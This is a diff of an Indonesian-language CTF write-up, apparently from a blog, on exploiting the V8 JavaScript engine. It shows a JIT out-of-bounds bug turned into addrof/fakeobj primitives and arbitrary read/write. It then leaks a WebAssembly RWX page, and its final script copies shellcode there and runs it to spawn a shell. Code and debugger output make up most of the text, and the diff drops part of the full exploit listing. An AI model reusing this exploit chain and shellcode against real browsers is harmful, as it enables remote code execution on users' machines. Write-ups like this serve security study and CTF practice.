 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">arr2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x808095208</span><span class="o">-</span><span class="mi">7</span><span class="p">));</span>
 <span class="mf">1.704258048</span><span class="nx">e</span><span class="o">-</span><span class="mi">313</span>
 
@@ -1576,7 +744,7 @@ Final payload menjadi <code class="language-plaintext highlighter-rouge">0x08083
 <span class="dl">"</span><span class="s2">0x800222d08203ae1</span><span class="dl">"</span>
 </code></pre></div></div>
 <p>See dengan ini kita bisa leak address apapun yang terdapat pada heap dari v8.
-Untuk ARW pun sama kita tinggal lakukan <code class="language-plaintext highlighter-rouge">fake[0] = value</code> maka fakeobj yang kita lakukan akan mengoverwrite address dari <code class="language-plaintext highlighter-rouge">0x19c808095208</code>.<br>
+Untuk ARW pun sama kita tinggal lakukan <code class="language-plaintext highlighter-rouge">fake[0] = value</code> maka fakeobj yang kita lakukan akan mengoverwrite address dari <code class="language-plaintext highlighter-rouge">0x19c808095208</code>.<br />
 Alright dengan ini kita bisa bikin fungsi seperti ini.</p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">){</span>
     <span class="k">if</span><span class="p">(</span><span class="nx">addr</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
@@ -1596,14 +764,14 @@ Alright dengan ini kita bisa bikin fungsi seperti ini.</p>
 
 <h2 id="gain-shell">Gain Shell</h2>
 <p>ALRIGHT FINAL STEP! HERE GO!. Kita sudah bisa Arbitary Read/Write, selanjutnya kita akan melakukan leak address dari <strong>wasm</strong> pada v8 itu sendiri. 
-Agar kita bisa mendapatkan address RWX pada v8, kita bisa menggunakan <strong>WebAssembly</strong>. Scriptnya seperti ini. <br></p>
+Agar kita bisa mendapatkan address RWX pada v8, kita bisa menggunakan <strong>WebAssembly</strong>. Scriptnya seperti ini. <br /></p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">11</span><span class="p">])</span>
 <span class="kd">var</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
 </code></pre></div></div>
-<p>Script ini akan membuat address RWX pada v8, hal yang perlu kita lakukan adalah leak address tersebut. Oke pertama2 kita run terlebih dahulu script tadi melalui gdb.<br>
-<img src="/assets/images/quickmaffs/quick9.png" alt="Quick9">
+<p>Script ini akan membuat address RWX pada v8, hal yang perlu kita lakukan adalah leak address tersebut. Oke pertama2 kita run terlebih dahulu script tadi melalui gdb.<br />
+<img src="/assets/images/quickmaffs/quick9.png" alt="Quick9" />
 Bisa kita lihat terdapat address rwx, nah bagaimana kita leak nya?, address tersebut terdapat didalam <strong>wasm_instance</strong></p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pwndbg</span><span class="o">&gt;</span> <span class="nx">c</span>
 <span class="nx">Continuing</span><span class="p">.</span>
@@ -1615,7 +783,7 @@ Bisa kita lihat terdapat address rwx, nah bagaimana kita leak nya?, address ters
 <span class="mh">0x3edb081d2060</span><span class="p">:</span>	<span class="mh">0x00000c1ff2d3a000</span>	<span class="mh">0x00005555566e9808</span>
 <span class="mh">0x3edb081d2070</span><span class="p">:</span>	<span class="mh">0x00005555566e9800</span>	<span class="mh">0x00005555566e9ee8</span>
 </code></pre></div></div>
-<p>Bisa kita lihat terdapat address RWX pada <strong>wasm_instance+0x60</strong> oke dengan ini kita bisa lakukan leak.<br></p>
+<p>Bisa kita lihat terdapat address RWX pada <strong>wasm_instance+0x60</strong> oke dengan ini kita bisa lakukan leak.<br /></p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">arr2</span> <span class="o">=</span> <span class="p">[</span><span class="nx">itof</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">),</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">];</span>
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Arr2: 0x</span><span class="dl">"</span><span class="o">+</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arr2</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
 <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">arr2</span><span class="p">);</span>
@@ -1653,7 +821,7 @@ Bisa kita lihat terdapat address rwx, nah bagaimana kita leak nya?, address ters
 <span class="nx">V8</span> <span class="nx">version</span> <span class="mf">9.7</span><span class="p">.</span><span class="mi">0</span> <span class="p">(</span><span class="nx">candidate</span><span class="p">)</span>
 </code></pre></div></div>
 <p>Kita check di vmmap
-<img src="/assets/images/quickmaffs/quick10.png" alt="Quick10">
+<img src="/assets/images/quickmaffs/quick10.png" alt="Quick10" />
 BOOM!!! Kita berhasil leak address dari RWX, selanjutnya tinggal write shellcode kedalam situ. Gimana caranya? Bisa pakai fungsi ini</p>
 
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">addr2</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">)</span> <span class="p">{</span>
@@ -1681,280 +849,11 @@ BOOM!!! Kita berhasil leak address dari RWX, selanjutnya tinggal write shellcode
 
 <p>Full script</p>
 
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">11</span><span class="p">])</span>
-<span class="kd">var</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
-<span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
-<span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
-
-<span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
-<span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
-<span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
-<span class="kd">let</span> <span class="nx">buf2</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x150</span><span class="p">);</span>
-
-<span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
-    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// typeof(val) = BigInt</span>
-    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
-    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
-    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
-<span class="p">}</span>
-
-
-<span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
-    <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{</span><span class="na">x</span><span class="p">:</span> <span class="kc">Infinity</span><span class="p">};</span>
-    <span class="kd">let</span> <span class="nx">v</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">exp</span><span class="p">(</span><span class="kc">Infinity</span><span class="o">-</span><span class="nx">a</span><span class="p">.</span><span class="nx">x</span><span class="p">);</span>
-    <span class="nx">v</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">v</span><span class="p">);</span>
-    <span class="nx">v</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">v</span><span class="p">);</span>
-    <span class="nx">v</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
-    <span class="nx">v</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="nx">v</span> <span class="o">+=</span> <span class="mi">10</span><span class="p">;</span>
-    <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">v</span><span class="p">);</span>
-    <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
-    <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
-<span class="p">}</span>
-
-
-<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> 
-    <span class="nx">foo</span><span class="p">();</span>
-
-<span class="kd">var</span> <span class="nx">oob</span> <span class="o">=</span> <span class="nx">foo</span><span class="p">();</span>
-<span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">A</span><span class="dl">"</span><span class="p">:</span><span class="mf">1.1</span><span class="p">};</span>
-<span class="kd">var</span> <span class="nx">obj_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">obj</span><span class="p">];</span>
-<span class="kd">var</span> <span class="nx">float_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">];</span>
-<span class="kd">var</span> <span class="nx">float_arr_map</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">oob</span><span class="p">[</span><span class="mi">31</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
-<span class="kd">var</span> <span class="nx">obj_arr_map</span> <span class="o">=</span> <span class="p">((</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">oob</span><span class="p">[</span><span class="mi">21</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">));</span>
-<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Float_arr_map: 0x</span><span class="dl">"</span><span class="o">+</span><span class="nx">float_arr_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
-<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Obj_arr_map: 0x</span><span class="dl">"</span><span class="o">+</span><span class="nx">obj_arr_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
-
-<span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">k</span><span class="p">){</span>
-    <span class="nx">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">k</span><span class="p">;</span>
-    <span class="nx">oob</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">float_arr_map</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
-    <span class="kd">let</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
-    <span class="nx">oob</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">obj_arr_map</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
-    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">k</span><span class="p">){</span>
-    <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">k</span><span class="p">);</span>
-    <span class="nx">oob</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">obj_arr_map</span><span class="p">);</span>
-    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
-    <span class="nx">oob</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">);</span>
-    <span class="k">return</span> <span class="nx">fake</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="kd">var</span> <span class="nx">arr2</span> <span class="o">=</span> <span class="p">[</span><span class="nx">itof</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">),</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">];</span>
-<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Arr2: 0x</span><span class="dl">"</span><span class="o">+</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arr2</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
-<span class="kd">var</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">((</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arr2</span><span class="p">)</span><span class="o">+</span><span class="mh">0x20</span><span class="nx">n</span><span class="p">));</span>
-
-<span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">){</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">addr</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
-        <span class="nx">addr</span> <span class="o">+=</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
-
-    <span class="nx">arr2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mi">8</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
-    <span class="k">return</span> <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
-<span class="p">}</span>
-
-<span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">){</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">addr</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
-        <span class="nx">addr</span> <span class="o">+=</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
-    <span class="nx">arr2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mi">8</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">addr</span><span class="p">)</span><span class="o">-</span><span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
-    <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">));</span>
-<span class="p">}</span>
-
-<span class="kd">function</span> <span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">addr2</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">DataView</span><span class="p">(</span><span class="nx">buf2</span><span class="p">);</span>
-    <span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf2</span><span class="p">);</span>
-    <span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="o">+</span><span class="mh">0x8</span><span class="nx">n</span><span class="p">;</span>
-    <span class="c1">//%DebugPrint(backing_store_addr);</span>
-    <span class="nx">arb_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr2</span><span class="p">);</span>
-    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="nx">i</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="kd">var</span> <span class="nx">test_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span><span class="o">+</span><span class="mh">0x60</span><span class="nx">n</span><span class="p">;</span>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">test_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span><span class="o">+</span><span class="mh">0x60</span><span class="nx">n</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">rwx_page_addr</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">arb_read</span><span class="p">(</span><span class="nx">test_addr</span><span class="p">));</span>
-<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">ADDRESS RWX: 0x</span><span class="dl">"</span><span class="o">+</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">0x</span><span class="dl">"</span><span class="o">+</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
 <span class="kd">var</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3091753066</span><span class="p">,</span> <span class="mi">1852400175</span><span class="p">,</span> <span class="mi">1932472111</span><span class="p">,</span> <span class="mi">3884533840</span><span class="p">,</span> <span class="mi">23687784</span><span class="p">,</span> <span class="mi">607420673</span><span class="p">,</span> <span class="mi">16843009</span><span class="p">,</span> <span class="mi">1784084017</span><span class="p">,</span> <span class="mi">21519880</span><span class="p">,</span> <span class="mi">2303219430</span><span class="p">,</span> <span class="mi">1792160230</span><span class="p">,</span> <span class="mi">84891707</span><span class="p">];</span>
 <span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">);</span>
 <span class="nx">f</span><span class="p">();</span>
 </code></pre></div></div>
-
-<p>Jangan lupa hapus semua <code class="language-plaintext highlighter-rouge">%Debug</code> nya.</p>
